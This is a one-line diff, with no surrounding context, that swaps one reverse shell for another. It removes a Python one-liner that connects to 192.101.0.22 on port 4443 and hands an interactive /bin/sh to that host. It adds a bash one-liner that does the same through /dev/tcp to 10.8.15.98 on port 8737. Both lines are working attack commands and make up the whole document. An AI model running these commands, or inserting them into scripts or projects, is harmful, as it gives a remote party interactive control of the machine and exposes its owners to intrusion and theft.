@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.101.0.22",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+bash -c 'bash -i >& /dev/tcp/10.8.15.98/8737 0>&1'
